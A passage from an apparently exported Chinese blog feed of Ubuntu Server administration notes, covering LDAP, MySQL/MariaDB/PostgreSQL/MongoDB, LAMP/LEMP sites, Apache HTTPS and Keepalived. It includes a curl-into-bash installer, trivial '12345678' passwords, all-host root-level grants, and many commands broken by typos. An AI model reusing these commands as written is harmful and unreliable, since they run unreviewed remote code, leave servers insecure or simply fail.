指定管理员帐号(完整的别名： cn=admin,dc=lab,dc=com) # -W 提示输入密码 # -f 指定ldif文件 验证 ldapsearch -x -LLL -b dc=lab,dc=com 'uid=zhangsan' cn sn gidNumber uidNumber givenName # 查看属性类型和值 参考网址 https://ldapwiki.com/wiki/ObkectClass#Types 修改数据跟上面是类似的 Web管理手动写配置太麻烦，图形化的简化了操作Web应用程序(有很多种)： ldap-account-manager (lam) sudo apt install apache2 sudo apt install php php-cgi libapache2-mod-php php-common php-pear php-mbstring sudo a2enconf php7.2-cgi # 激活这个模块 sudo systemctl reload apache2 sudo systemctl restart apache2 sudo apt install ldap-account-manager # ldap-account-manager使用的数据库使用的是目录服务的数据库，但是他的数据也没有写到数据库中，而是存在了配置文件中 # 访问即可 # http:/192.168.0.104/lam # 点击右上角 LAM configuration 配置 edit server... , 进行简单配置 # 其他配置根据自己需求来改 设置安全访问 sudo vim /etc/apache2/conf-enabled/ldap-account-manager.conf #Require all granted 注释掉所有ip可访问 Require ip 127.0.0.1 192.168.0.0/24 # 重启服务 其他ldap基于web的管理工具 # phpLDAPAdmin sudo apt install phpldapadmin # 创建组帐号 # 创建帐号 # ... 客户端Windows客户端win自带的GINA提供Windows系统登录界面， 支持本机、域账户登陆 pGina开源身份认证提供者 - 集成并替换window系统默认的GINA - 通过插件支持大量身份验证数据存储(LDAP, MySQL, RADIUS) - `http://pgina.org` 下载安装稳定版 进行一些配置 Linux客户端域名解析 echo "192.168.0.104 ldap.lab.com" |sudo trr -a /etc/hostss 安装客户端 sudo apt install libnss-ldap libpam-ldap ldap-utils nscd # 指定一些参数 ldap://ldap.lab.com dc=lab,dc=com cn=admin,dc=lab,dc=com 修改配置文件 # sudo vim /etc/nsswitch.conf passswd: compat systemd ldap group: compat systemd ldap shadow: compat ldap # sudo vim /etc/pam.d/common-password 删除 use_authtok 这一小块 # sudo vim /etc/pam.d/common-session session optional pam_mkhomedir.so skel=/etc/skel umask=077 # 允许创建用户主目录 sudo systemctl restart nscd.service # 验证 getent passwd zhangsan reboot # 登录的时候，点击 not list 才能进入刚才的帐号 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>LDAP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server- ubuntu-server-数据库管理服务]]></title>
    <url>%2Fposts%2F677%2F</url>
    <content type="text"><![CDATA[ubuntu-server-数据库管理服务 数据就是生产力 数据就是应用的核心按照结构组织，存储和管理数据的仓库Oracle, DB2, MySQL, MSSQL, PostgreSQL, Infomix, MongoDB 数据库管理系统(DBMS) MySQL数据库管理 安装 sudo apt install mysql-server 安全配置 sudo mysql_secure_installation # 建议禁止root远程登录 # 这里设置的root的密码不是，后面才设置, 因为初始身份认证方式是auth_socket Root帐号密码登录 sudo mysql # 初始身份认证方式是auth_socket，所以暂时不需要输入密码 SELECT user,host,authentication_string, plugin,host FROM mysql.user; # 给root设置密码认证方式mysql_native_password ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '12345678'; FULSH PRIVILEGES; # 登录 mysql -u root -p 创建数据库个人帐号(建议不要使用root进行运行,而应该使用个人帐号, 且密码不能相同) create user 'xps'@'%' identified by '12345678'; # 赋予权限(4级) # *.* 是哪个库哪个表，这里表示所有库所有表 grant all privileges on *.* to 'xps'@'%' with grant option; 修改密码 set password for 'xps'@'%'=password('12345678'); 网络访问帐号(可以远程访问) # 一般这种情况，都限制要操作的库和操作 # % use mysql # 直接grant赋予权限，就可以创建不存在的用户 grant all privileges on *.* to admin@'%' identified by '12345678' with grant option; # 移除权限 revoke all on db_name from user_name; # 查看密码策略(一旦允许网络连接，密码级别就会变成中安全级别了) select @@validate_password_policy; 编辑配置文件 # sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf # 修改侦听网卡为自己网卡的ip地址 bind-address = 192.168.0.112 # 重启网卡 # 使用mysql客户端连接， 或Falcon等图形化客户端 mysql -h 19.168.0.112 -u root SQL语句增删改查最基本 -- 当前帐号 select user(); -- 查看已经有的库 select databases; -- 选取(切换)库 use test; select database(); -- 显示表(已选择库) show tables; -- 简单创建库 create database test; 创建表 create table users( id INT NOT NULL PRIMARY KEY AUTO_INCREMENT, name CHAR(25) NOT NULL, pass CHAR(25) NOT NULL, age INT(9) NOT NULL ) char的性能要优于varchar 插入记录 insert into users values(1,'xps','1234567890',20); insert into users(id,name,pass,age) values(null,'xps','1234567890',20); # 指定列 查看表结构 desc users; show create table users; # Engine=InnoDB 存储引擎 show full columns from users; 查询 select * frm users where age &lt;20 and age >16; select name,pass from users order by age; select name,pass from users order by age desc; # 降序 select concat(name,0x7e,pass,0x7e) as user_pass from users; # concat 结合， 表头变成user_pass select group_concat(name, pass) from users; 修改记录 update users set name='xpsss' where id=1; 删除记录 delete from users where id=1; 删除表 drop table tests; drop table if exists tests; 删除库 drop database test; 查看数据引擎 show engines; # 修改存储引擎（这里指定表） alter table student engine=MYISAM; 修改表名 alter table student RENAME student2; 修改字段数据类型 alter table student MODIFY name varchar(30); 修改字段名 alter table student CHANGE name uname varchar(40); 增加字段 alter table student ADD techer_name vchar(20) NOT NULL after id; # 位置放在id字段的后面 删除字段 alter table student FROP teacher_name; 备份备份导出备份库，表 mysqldump -u root -p tes_db >db_back.sql mysqldump -u root -p test_db users >db_back.sql mysqldump --all-databases -u root -p >all_db_back.sql 备份指定数据 # 先进入sql命令终端，进行导出 select * from users; > q.sql ## 或者 # 1. 先把sql语句保存为文件， echo 'select * from users;' > q.sql # 2.然后执行来进行导出 mysql -u root -p test &lt; q.sql >out.csv 导出CSV show variables like '%secure%'; # 先找到备份路径，找到secure_file_priv路径就是默认导出的路径 # 保存， 并执行分隔或换行 select * from users into outfile '/var/lib/mysql-files/aaa.csv' fields terminated by ',' enclosed by lines '"' terminated by '\n'; 导入导入 # 创建库的命令 mysqladmin -u root -p create db2 # 也可以在sql终端 create database xxx; # 导入 mysql -u root -p db2 &lt; db_bak.sql 导入CSV LOAD DATA INFILE '/var/lib/mysql-files/aaa.csv' INTO TABLE users FIELDS TERMINARED BY ',' ENCLOSED BY '"' LINES TERMINARED BY \n IGNORE 1 ROWS; MariDB安装配置安装 sudo apt install mariadb-server 安全认证 sudo mysql_secure_installation 改为密码认证 sudo mysql use mysql; select user.host,plugin,password from mysql.user; # 查看 update user set plugin='' where user ='root' # mysql_native_password或空就行 fulsh privileges; 配置文件 # /etc/mysql/mariadb.conf.d/50-server.cnf bind-address = 0.0.0.0 # 每一个网卡都会侦听3306 主备服务器(数据库复制)复制 ReplicationMaster -&gt; Slave 读/写限定所有库，指定库，表 进行复制 复制原理bin-log 二进制日志所有DB事件先写入bin-logSlave从Master读取bin-log 用途 扩展：Slave分担master负载 分析：数据分析不影响Master 备份：作为一种数据备份手段 分布：异地保存数据副本（也可以实现应用访问本地库） 演示1.安装两台独立的MariaDB服务器 复制之前用导入导出数据库的方式保持Master/Slave数据一致 复制前锁定库(禁止写入) # 生产环境 flush tables with read lock; 2.配置 Master # suo vim /etc/mysql/conf.d/mysql.cnf #增加如下配置 [mysqld] log-bin # 开启bin-log功能 binlog-do-db=test # binlog-ignore-db="mysql" # 除了忽略的库，其他的全复制 server-id=1 3.配置master的mariadb远程访问bind-address 0.0.0.0 4.重启服务 sudo systemctl restart mariadb 5.配置master创建用户帐号 #192.168.0.111 是slave的地址， *.*允许复制所有数据库, replicate用户名 grant replicate *.* to 'replicate'@'192.168.0.111' with identified by 'passwd'; 6.配置Slave ## 1. # suo vim /etc/mysql/conf.d/mysql.cnf #增加如下配置 [mysqld] server-id=1 ## 2.开启远程访问bind-address 0.0.0.0 ## 3. 重启数据库服务 7.登录sql终端 # master_user是master服务器上创建的mysql的用户 change master to master_host="192.168.0.112",master_user="replicate",master_password='password'; 8.打开master锁unlock tables; 9.查看slave状态 -- slave的sql终端 show slaves status\G start slave; # 如果没启动，可以手动启动 测试效果 # 在master执行 cd test; insert into users values(1,'yyy','pass'); delete from users where id=1; # 在slave上查询，发现数据已经同步过来了，近乎实时 Mysqltuner – 配置调优工具包安装 sudo apt install mysql 运行sudo Mysqltuner会生成一堆信息配置调优建议(绿色的表示没问题，其他颜色的可以根据帮助来优化) Postgresql 下一代关系数据库 配置和修改 高并发情况下性能优于MySQL 侦听端口 TCP 5432 安装 sudo apt install postgresql 身份认证 默认使用IDENT身份认证方式 使用与操作系统同名的数据库帐号(postgres相当与MySQL中的root) 进入 sudo -u postgres psql # 直接登录到库的名称(template1是默认生成的) sudo -u postgres psql template1 修改密码 # sql终端 # 使用加密的方式 alert user postgres with encrypted password 'your_passwd'; \q # 退出 # bash终端 # 修改配置文件 vim /etc/postgresql/10/main/pg_hba.conf local all postgres md5 # 本地登录 所有数据库 身份 密码md5加密 # 重启服务 # 登录 -W输入密码 psql -U postgres -W -d db_name 配置文件 /etc/postgresql/&lt;version>/main # 配置文件目录 /etc/postgresql/10/main/pg_ident.conf # IDENT身份认证配置 /etc/postgresql/10/main/postgresql.conf # 网络身份认证配置 # listen_address='*' # IPV6 '::' 网络连接 # 客户端 sudo apt install postgresql-client # 设置允许哪些主机连接我们(必须指定掩码) vim /etc/postgresql/10/main/pg_hba.conf local all postgres 192.168.0.111/32 md5 #重启服务 # 客户端连接 psql -h 192.168.0.112 -U postgres -W -d db_name 创建帐号 # postgres权限太大，不建议平时使用 # F1 服务器端终端 sudo -u postgres createuser xps # gropuser xps # F2 sql命令行 create user foobar; # drop user xps 文档手册 sudo apt install postgresql-doc-10 /usr/share/postgresq-doc-10/html/index.html 官方文档: https://www.postgresql.org/docs/current/static/tutorial.html 基本指令创建库 # sudo -u postgres createdb mydb; # 或 create database mydb; 删除库 sudo -u postgres dropedb mydb; # 或 drop database mydb; 创建表 create database users ( uname varchar(25); pwd carchar(25); date date ); `` 插入数据 ​```bash insert into users values('xps','1234567890','1997-07-07'); # 批量插入数据(数据提前保存) copy users from '/home/user/users.txt' 快捷命令 \c db_name # 切换数据库 （use mydb;） \c - username # 切换用户 \l # 列出数据库(show databases;) \dt # 列出表(show tables;) \d table_name # 查看表结构 NoSQL概览与MongoDB 常见的NoSQL数据库类型1.键值对类型 Paper推荐多看看 MongoDB安装 sudo apt-get install -y mongodb 客户端 # 本地登录 mongo # 远程登录 mongo 192.168.0.112:27017/db_name # 常用管理命令 help 进入库 use mydb; # 如果不存入数据，他还是就没了 输入数据 # 创建文档集 db.createCollection('users') # 插入数据 db.users.insert({'name':'uuu','uid':123}) 查询库 show dbs show collections 多赋值 db.users.insert({'name':'uuu','uid':123,gid:[111,222,333]}) 查询 db.users.find(); db.users.findOne({'uid':1001}) db.users.findOne({'uid':{$gt：1000}}) # 大于 db.users.find({'uid':{$gt：1000}}) # 大于 db.users.find({$or: [{name:'ubuntu'}, {name;'centos'}]}) # or db.users.findOne({'uid':1001}, {name:0}) # name:0 不显示name字段 修改记录 db.users.update({'uid':1001}, {$set:{name:'hhh'}}) 删除记录 db.users.remove({'uid':1001}, ) 删除collection db.users.drop() 删库 db.dropDatabase() 详细用法参考官方文档…… document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>ubuntu-server-数据库管理服务</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-LAMP]]></title>
    <url>%2Fposts%2F45152%2F</url>
    <content type="text"><![CDATA[LAMP环境安装WordPressWEB应用程序基础套件 操作系统( Linux ) WEB服务器( Apache、Nginx ) 数据库( MySQL、MariaDB、 PostgreSQL) 应用开发语言( PHP、Python、 Perl ) 大量开源应用基于LAMP开发 Wordpress Wiki Owncloud Phpmyadmin … … 安装LAMP(Linux + Apache + MySQL +PHP)自动安装 # 一次性安装 tasksel 简单快捷 apt install tasksel # 运行工具 sudo tasksel # 选择安装包,q 勾选，确定即可 #测试 echo "&lt;?php phpinfo();?>" > /var/www/html/info.php 手动安装 apt install apache2 apt install mysqk-server mysql_secure_installation apt install php libapache2-mod php-mysql #测试 echo "&lt;?php phpinfo();?>" > /var/www/html/info.php WordPress 开源免费的个人博客系统 全球1/3的个人博客采用 基于LAMP开发 开箱即用 安装 wget http://wordpress.org/latest.tar.gz sudo tar -zxvf latest.tar.gz -C /var/www/html # 设置权限 sudo chown www-data:www_data -R /var/www/html/myshop # 还没有数据库 创建数据库 -- 进入sql命令行（建议用户名密码和库名不要这么简单易猜） create database wpdb; create user 'wpuser'@'localhost' identified by '12345678'; grant all on wpdb.* to 'wpuser'@'localhost' identified by '12345678' with grant option; flush privileges; 配置文件 cd /var/www/html/wordpress/ cp wp-config-sample.php wp-config.php # 从模板文件复制 vim wp-config.php # 修改库名，用户，密码 # 他会自动写进去表 虚拟主机不建议使用默认站点 cd /etc/apache2/sites-available/ cp 000-default.conf myblog.conf vim myblog.conf ServerName www.myblog.com DocumentRoot /var/www/html/wordpress # 其他安全配置 启用站点 a2ensite myblog.conf a2dissite 000-default.conf # 禁用默认站点 systemctl reload apache2 Web配置访问设置的域名http://myblog.com 改为中文从官网下载中文语言包解压到/wp-content/目录下，修改wp-config.php define('WPLANG', 'zh_CN') 或者直接下载中文版https://cn.wordpress.org PHPMyAdmin &amp; 电商网站搭建phpMyAdmin基于Web应用的MySQL管理应用, 本身也是一个应用程序 1.修改身份验证方式 # 进入sql终端 select user,host,plugin from mysql.user; "auth_socket" --> "mysql_native_password" 2.安装PhpMyAdmin apt install phpmyadmin 3.修改/etc/apache2/apache2.conf主配置文件 # 包含phpmyadmin的配置文件 Include /etc/phpmyadmin/apache.conf 测试 http://wwwwww/phpmyadmin/ 电商网站搭建安装prestashop开源的电商平台 开源免费 全球有25万台电商平台使用 基于LAMP套件 1.安装依赖包 sudo apt install php7.2-gd php7.2-xml php7.2-curl php7.2-zip 2.下载 wget https://download.prestashop.com/download/releases/prestashop_1.7.4.1.zip sudo unzip prestashop_1.7.4.1.zip -d /var/www/html/myshop sudo chown www-data:www_data -R /var/www/html/myshop 3.创建数据库 sudo mysql -- 进入sql命令行（建议用户名密码和库名不要这么简单易猜） create database myshop; create user 'myshop'@'localhost' identified by '12345678'; grant all on myshop.* to 'myshop'@'localhost' identified by '12345678' with grant option; flush privileges; 4.虚拟主机(不建议使用默认站点) cd /etc/apache2/sites-available/ cp 000-default.conf myshop.conf vim myshop.conf ServerName www.myshop.com DocumentRoot /var/www/html/myshop # 这里只配置了最简单的，其他的配置按照前面的章节自行配置 5.启用站点 sudo a2enmod rewrite # 启用这个模块 sudo a2ensite myshop.conf #a2dissite 000-default.conf # 禁用默认站点 systemctl reload apache2 6.访问站点，进行Web配置表名的前缀不要默认，否则如果有漏洞，容易被猜解安装完成之后，要删除install文件 这个网站源码是免费的，但是主题是收费的……且支付接口没国内的 LEMP环境安装NextCloudLEMP(Linux, Nginx, MySQ, PHP)Engine-x -&gt; Nginx 1.安装 sudo apt install nginx sudo apt install mariadb-server mariadb-client sudo mysql_secure_installation # 针对不同软件包，安装不同的组件，这里安装下面这些 sudo apt install php7.2 php7.2-fpm php7.2-mysql php7.2-mbstring php7.2-xml php7.2-gd php7.2-curl php7.2-imagick php7.2-zip php7.2-bz2 php7.2-intl # 配置php sudo vim /etc/php/7.2/fpm/php.ini cgi.fix_pathinfo=0 date.timezone = Asia/shanghai 2.配置Nginx # 这里使用默认站点 # sudo vim /etc/nginx/sites-available/default index index.php location ~\.php$ { fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include snippets/fastcgi-php.conf; include fastcgi_params; } # 重启 sudo nginx -t sudo systemctl restart nginx 3.访问, 验证环境是否成功 4.下载NextCloud # NextCloud 免费开源的个人云盘 # 官网下载或wget下载 wget https://download.nextcloud.com/server/releases/nextcloud-13.0.4.zip sudo unzip nextcloud-13.0.4.zip -d /var/www/html/mycloud sudo chown www-data:www-data -R /var/www/html/mycloud 5.建库 -- 进入sql命令行 create database mycloud; create user 'mycloud'@'localhost' identified by '12345678'; grant all privileges on mycloud.* to 'mycloud'@'localhost' identified by '12345678' with grant option;; flush privileges; 6.生成证书(安全考虑) # 这里使用自签名证书 sudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/mysite.key -out /etc/ssl/certs/mysite.pem 7.配置文件 # cd /etc/nginx/site-available/ # sudo vim mycloud.conf server { listen 80; server_name www.mycloud.com; # 不让访问者通过http访问，强制重定向 return 301 https://www.mycloud.com$request_uri; } server { listen 443 ssl http2; # 证书位置 ssl_certificate /etc/ssl/certs/mysite.pem; ssl_certificate_key /etc/ssl/private/mysite.key; # 头部 add_header Strict-Teansport-Security "max-age-31536000" always; # ssl增强版协议的头部 # 等经验丰富后，自己要添加头部信息你 add_header X-Conten-Type-Option nosniff; add_header X-XSS-Protection "1;mode=block"; add_header X-Robots-Tag none; add_header X-Download-Options noopen; add_header X-Permitted-Cross-Doamin-Policies none; root /var/www/html/mycloud/; location = /robots.txt { allow all; log_not_found off; access_log off; } location = /.well-known/carddav { retun 301 $schema://$host/remote.php/dav; } location = /.well-known/calddav { retun 301 $schema://$host/remote.php/dav; } location = /.well-known/acme-challenge { allow all; } client_max_body_size 512M; fastcgi_buffers 64 4K; gzip off; error_page 403 /core/templates/403.php; error_page 404 /core/templates/404.php; location = / { rewrite ^ /ince.php$uri; } location = /(?:build|tests|config|lib|3rdparty|templates|data)/ { deny all; } # ....... } ## ......剩下详细的配置 8.启用站点配置 ln -s /etc/nginx/site-available/mycloud.conf /etc/nginx/site-enabled/mycloud.conf # reload 并 restart nginx 9.Data目录 # 文件资源默认会在项目根目录下的Data目录 # 建议不要放在默认位置, 这里放在上一级目录 sudo mkdir /var/www/html/cloud_data sudo chown www-data:www-data -R /var/www/html/cloud_data 10.网页设置 访问 https://xxxxx.com # 设置用户名/密码，数据库，data目录 # 注意账户安全哦(不要设置admin等) # 修改语言 11.客户端 sudo add-apt-repository ppa:nextcloud-devs/client sudo apt install nextcloud-client # 或官网下载PC和android的客户端 其他Web应用1.Cockpit 基于Web的远程管理和系统监控 基于Web的远程管理应用 将所有组件打包在一起 不以来单独部署的LAMP/LEMP, 一条命令安装部署 安装 sudo apt install cockpit cockpit-docker 访问方式: https://www.com:9090 登录账户同操作系统 可以看到系统的详细信息，管理 可以添加其他安装了Cockpit的服务器在一个机器的Web界面安装(前提是登录窗口时候进行勾选), 多台服务器 官网地址: https://cockpit-projece.org Netdata 基于Web建构的Linux系统实时性能监视工具 cpu, 内存，硬盘，网络，进程，硬件 占用系统资源少(1-3%) 实时自动告警 系统出问题之前，往往有异常的征兆 依赖包 sudo apt install git zlib1g-dev uuid-dev libmnl-dev gcc make autoconf autoconf-archive autogen automake pkg-config curl python python-yaml python-mysqldb python-psycopg2 nodejs lm-sensors netcat 安装 bash &lt;(curl -Ss https://my-netdata.io/kickstart-static64.sh) # 现在不能访问了 # 或用apt安装 sudo apt install netdata # 访问 http://xxxxx.com:19999 开关 # 启动：位置根据系统会有不同。建议加上-D参数前台运行，不要后台运行 $ sudo netdata -D $ 或 $ sudo /usr/sbin/netdata -D # 或（Mac上） $ sudo /usr/local/sbin/netdata -D # 关闭（方法很多种，往往只有一种生效） $ sudo killall netdata # 或 $ sudo pkill -9 netdata # 或 $ sudo service netdata stop # 或 $ sudo /etc/init.d/netdata stop # 或 $ sudo systemctl stop netdata document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>LMAP</tag>
        <tag>LEMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-Web服务]]></title>
    <url>%2Fposts%2F6291%2F</url>
    <content type="text"><![CDATA[WWW介绍www 万维网 静态网站：所有人看到的内容都一样 动态应用程序： 数据库、中间件 每个用户看到的内容不同 根据用户输入返回不同结果 访问方式 FQDN：(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。（通过符号“.”） 传输协议SSL基本被替代了，TSL使用最多put常用于上传文件options查看都支持哪些方法header只是头部的信息(请求/响应) HTTP协议常见服务端响应状态码更多详细状态码，见地址： http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html Apache2Apache软件基金会的一个开源Web服务器模块化强大的扩展能力： SSO模块 并发限制模块 日志监控模块 WAF模块 负载均衡模块 音乐/图像处理模块 安装sudo apt install apache2 # 默认侦听端口 TCP 80 通过众多directives进行配置在Ubuntu中，directives分散于多个配置文件中 配置文件：conf-enabled(启用的)中的文件都是链接到conf-available(可用的)下的配置文件（创建了链接的才生效的，所以可以配置一些备用的不设置链接），修改完需要重启服务模块目录：mods-enabled与mods-available，跟上面两者关系类似站点：sites-enabled与sites-available 不同ip以及不同端口可以映射不同的网站 –&gt; 同一个ip同一个端口来设置多个网站(不同域名都解析到这个ip, 服务端根据域名字段[主机头]来判断返回哪个页面) –&gt; 即为虚拟主机 虚拟主机简单配置 一般先从available目录开始创建，至于启用与否还得配置enabled本质上配置指令可以位于任何一个配置文件中 配置sites-available下讲解： # /etc/apache2/sites-available/000-default.conf # 默认虚拟主机 &lt;VirtualHost *:80> # 匹配ip，*代表任意ip , 侦听任意ip的80端口 ServerName www.example.com # 设置主机头（虚拟主机的域名） ServerAdmin webmaster@localhost # 报错时显示的管理员邮箱 DocumentRoot /var/www/html # 指定Web根目录 ErrorLog ${APACHE_LOG_DIR}/error.log # 报错日志 CustomLog ${APACHE_LOG_DIR}/access.log combined # 访问日志 # 侦听端口 &lt;/VirtualHost> 实验创建ali和baid两个域名的虚拟主机1.创建新的虚拟主机（在sites-available） # 复制两个配置文件 sudo cp 000-default.conf ali.conf sudo cp 000-default.conf baid.conf # 分别进行配置 ServerName www.ali.com DocumentRoot /var/www/ali # ServerName www.baid.com DocumentRoot /var/www/baid # 分别编辑页面文件 sudo vim /var/www/ali/index.html sudo vim /var/www/baid/index.html 2.创建链接(在sites-enabled) # 可以用ln 创建 # apache提供了更简单的方式 sudo a2ensite ali sudo a2ensite baid # 重新加载 service apache2 reload ## Note： ServerAlias *.lab.com # 域名通配符 sudo a2ensite mynewSite # 启用虚拟主机 sudo systemctl restart apache2.service # 重启服务 sudo a2dissite mynewSite # 停用虚拟主机（禁用某个站点） 3.这里做实验，域名就简单通过hosts文件做了解析 192.168.11.130 www.ali.com 192.168.11.130 www.baid.com 3.访问 侦听端口/etc/apaches/ports.conf Apache中默认基本配置1.索引文件index：DirectoryIndex ## 可以根据需求,手动修改索引页的名称（一般不建议修改） # /etc/apache2/mods-available/dir.conf &lt;IfModule mod_dir.c> DirectoryIndex index.html index.cgi index.pl index.php index.xhtml index.htm # 有先后的执行顺序 &lt;/IfModule> # Note： 若没有正确放置index索引文件，会看到文件列表，可能会有安全隐患 2.html格式展示目录列表：Options【安全考虑】–&gt;去掉由于没有索引文件会显示文件列表的选项 ## /etc/apache2/apache2.conf 主配置文件 &lt;Directory /var/www/> # 对文件目录权限的配置 Options Indexes FollowSymLinks # Indexes:若没有索引文件,就会显示目录列表;去掉Indexes就不会显示列表了，提示"权限拒绝" AllowOverride None Require all granted &lt;/Directory> # 重启服务 3.Permission Denied 以上1,2两项都不匹配，就会显示”权限拒绝” 4.ErrorDocument 报错提示【安全考虑】–&gt; 默认404或报错页面会泄露信息或扫描器，建议替换为我们自定义的页面–&gt;不告诉用户不成功的具体原因,只告诉他出错了 # /etc/apache2/conf-available/localized-error-pages.conf ErrorDocument 404 /error/404.html # 定义自己的页面 # 重启服务 5.基于目录的Options ## /etc/apache2/apache2.conf 主配置文件 &lt;Directory /var/www/> Options Indexes &lt;/Directory> # 其他配置项(权限要最小化原则，安全起见) ExecCGI # 允许CGI脚本执行的目录(/usr/lib/cgi-bin) Includes # 允许服务端包含（一个html包含另一个html,模板化） IncludeNOEXEC # 允许包含，但进展CGI脚本exec、include # 重启服务 6.环境变量 # /etc/apache2/envvars 可以修改用户和组和pid等 User /Group # 服务器端应答客户端访问的账号(www-data) PidFile # /var/run/apache2/apache2.pid # 最大并发数（默认8192） APACHE_ULIMIT_MAX_FILES='ulimit -n 65536' 模块化服务器核心只实现了基本功能 apache2 -l # 查看默认被编译到apache核心包里面的模块 其他功能通过模块实现ubuntu编译动态加载模块实现运行时模块调用 apt search libapache2-mod # 搜索模块 sudo apt install libapache2-mod0auth-mysql # 安装模块 sudo a2enmod auth_mysql # 启用模块 sudo a2dismod auth_mysql # 禁用模块 开启HTTPS传输过程中的CIA (机密性、完整性、可用性)，但是不提供应用层安全 # /etc/apache2/sites-available/default-ssl.conf sudo a2ensite default-ssl # 开始ssl加密(默认未启动) sudo a2ebmod ssl # 默认未启动 _default_:443 # 未指定虚拟主机情况下的443端口访问, 默认是443(除了其他指定了虚拟主机名的，未指定的就访问到这里) SSLEngine on # 开启SSl/TSL SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem # 证书文件(默认已经自带了一张证书) SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key SSLCertificateChainFile /etc/apache2/ssl.crt/server-ca.crt # 证书的加密链文件 SSLCARevocationFile /etc/apache2/ssl.crl/ca-bundle.crl # 证书吊销列表 SSLVerifyClient require # 要求客户端提供证书(不可抵赖性) &lt;FilesMatch "\.(cgi|shtml|phtml|php)$"> # 基于文件类型，设置不同环境变量进行加密 SSLOptions +StdEnvVars &lt;/FilesMatch> &lt;Directory /usr/lib/cgi-bin> # 对指定目录 SSLOptions +StdEnvVars # 标准环境变量 &lt;/Directory> ssl-unclean-shutdown # 只是服务器端向客户端断开连接(追求速度) ssl-accurate-shutdown # 服务器端与客户端的连接端口了，客户端还有向服务端再确认(追求稳定性) nokeepalive ssl-unclean-shutdown downgrade-1.0 force-response-1.0 # 降级响应 # 还可以按自己需要... ## 启用并重启服务 sudo a2ensite default-ssl service apache2 reload sudo systemctl restart apache.service ## 可以访问了(ubuntu自己生成的证书浏览器会提示不安全) 证书向证书颁发机构申请的合法证书就可以替换ubuntu自带的证书 # 使用CA机构签名证书 sudo openssl req -newkey rsa:2048 -nodes -keyout server.key -out server.pem # 使用自签名证书 sudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/mysite.key -out /etc/ssl/certs/mysite.pem 创建HTTPS虚拟主机和创建一般虚拟主机是类似的 建议商业证书颁发机构(权威机构颁发，默认受信，增强特性，收费高昂，有效期长) 那没钱怎么办呢？有几家机构已经有免费的了，比如Let's encryptLet’s encrypt 致力于加速全文实现https的免费证书颁发机构 证书有效期90天(可刷新) 专门客户端程序 Certbot，简化证书步骤sudo add-apt-repository ppa:certbot/certbot # 添加仓库 sudo apt update sudo apt install cerbot python-cerbot-apache 使用方法： # 前提 域名正常解析、设置好虚拟主机 # 申请证书 (--apache意思是给apache用的， -d是域名,还有子域名) sudo certbot --apache -d example.com -d www.example.com # 证书位置 /etc/letsencrypt/live # 查看证书状态(换成自己的域名) https://www.ssllab.com/ssltest/analyze.html?d=example.com&amp;latest Apache支持PHP1.安装 sudo apt install php7.2 libapache2-mod-php7.2 # mod-php模块 # 验证 php -v 2.启用模块 # 直接启用即可 a2enmod php7.2 # Apache对php的支持是模块化的，而Nginx对php支持的配置方式比较原始 索引文件 vim /etc/apache2/mods-available/dir.conf # index.php # 重启 sudo systemctl restart apache2 配置文件 /etc/php/7.2/ # 下面不同的目录，是针对不同应用的，这里apache的在apache子目录下面 /usr/lib/php/7.2/ # 为不同的使用场景的配置文件(开发环境与生产环境，一般情况下会把这里的文件链接到上面的配置中) Keepalived高可用的一种解决方案：Keepalived 实现高可用(HA) 在服务器组内漂移的VIP（多台服务器实现一个组，但也是一个域名，解析到一个ip） Master独占VIP，其他Server检查Master可用性 Keepalives并非专门针对Apache而设计 常用于负载均衡技术环境 组内服务器应提供相同内容和配置 组内不同服务器有优先级，多个服务器共用一个漂移的ip地址(VIP)，处于正常状态的服务器叫Maste 安装sudo apt-get install keepalived # 因为无配置，所有默认启动失败 /etc/keepalived/keepalived.conf # 配置文件（需要创建） 配置文件： # 可选配置项，但是一般建议配置 global_defs { notification_email { myemail@mycompany.com # 发送邮件给谁 } notification_email_from keepalives@mycompany smtp_server 192.168.1.150 smtp_connect_timeout 30 router_id mycompany_web_prod } # 关键配置 # 1号配置实例 vrrp_instance VI_1 { smtp_alter interface enp0s3 # 网卡接口优先级 virtual_router_id 51 # 定义服务器组 priority 100 # 优先级(自己定义，保证顺序即可) advert_int 5 # 周期性通告的间隔时间 virtual_ipaddress { 192.168.1.200 # VIP（DHCP以外） } } # 重启服务 systemctl start keepalived systemctl status -l keeplived # 网卡绑定VIP ip a 等待30s # 安装第二台服务器，并进行类似的配置(优先级修改,vip地址填写一样的) # 模拟切换 